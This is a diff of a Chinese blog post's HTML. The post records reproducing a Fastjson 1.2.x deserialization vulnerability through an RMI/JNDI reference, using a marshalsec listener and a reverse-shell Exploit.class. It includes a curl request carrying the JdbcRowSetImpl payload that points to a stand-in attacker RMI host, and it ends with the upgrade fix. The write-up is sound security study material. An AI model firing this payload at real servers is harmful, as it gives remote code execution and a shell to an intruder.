@@ -88,8 +88,9 @@
 <meta property="og:description" content="漏洞背景关于 fastjson 最近几年爆出的反序列问题比较多，各种绕过。护网期间，据说也爆出了新的姿势，目前还无完整分析，这里记录之前漏洞版本 RMI 监听方式进行反序列化利用，之后利用方式类同。 本次漏洞记录的 Fastjson 版本是 1.2.7。 漏洞复现起初利用 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类来构造">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2019/11/07/vZCDBI2QrbpPAfS.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/07/eypbzaGLqkRIHPu.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/07/pGgoOH6SRW9AVk5.png">
-<meta property="og:updated_time" content="2019-11-07T06:29:52.589Z">
+<meta property="og:updated_time" content="2019-11-07T06:36:52.968Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Fastjson反序列化RMI漏洞利用记录">
 <meta name="twitter:description" content="漏洞背景关于 fastjson 最近几年爆出的反序列问题比较多，各种绕过。护网期间，据说也爆出了新的姿势，目前还无完整分析，这里记录之前漏洞版本 RMI 监听方式进行反序列化利用，之后利用方式类同。 本次漏洞记录的 Fastjson 版本是 1.2.7。 漏洞复现起初利用 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类来构造">
@@ -369,11 +370,12 @@
 <p>本次漏洞记录的 Fastjson 版本是 1.2.7。</p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>起初利用 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类来构造 Poc，要求开发使用 JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)这种形式解析，大部分情形下都是只传入 input 参数，而不考虑其他设置，于是这种方式条件苛刻，无法利用。</p>
 <p>网上还有很多其他的利用方式，基于JNDI Property 类型，基于 JNDI Field 类型。这里使用第二种， RMI + JNDI Reference Payload 方式，攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类。</p>
-<p>使用 marshalsec 启动 RMI 监听服务，通过在 攻击机器 web 服务放置 Exploit.class, 靶机通过 RMI 客户端远程调用。</p>
 <p>由于 Exploit.class 写的是 反弹shell 的命令，去监听端口</p>
 <p><img src="https://i.loli.net/2019/11/07/vZCDBI2QrbpPAfS.png" alt></p>
+<p>使用 marshalsec 启动 RMI 监听服务，通过在 攻击机器 web 服务放置 Exploit.class, 靶机通过 RMI 客户端远程调用</p>
+<p><img src="https://i.loli.net/2019/11/07/eypbzaGLqkRIHPu.png" alt></p>
 <p>客户端提交恶意请求如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ivv http://xxx.com/queryNotice -H <span class="string">'Content-type: application/json'</span> -d <span class="string">'&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1099/Exploit","autocommit":"true"&#125;'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ivv http://xxx.com/queryNotice -H <span class="string">'Content-type: application/json'</span> -d <span class="string">'&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://host:1099/Exploit","autocommit":"true"&#125;'</span></span><br></pre></td></tr></table></figure>
 <p>可监听到shell</p>
 <p><img src="https://i.loli.net/2019/11/07/pGgoOH6SRW9AVk5.png" alt></p>
 <h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级到Fastjson最新版本</p>
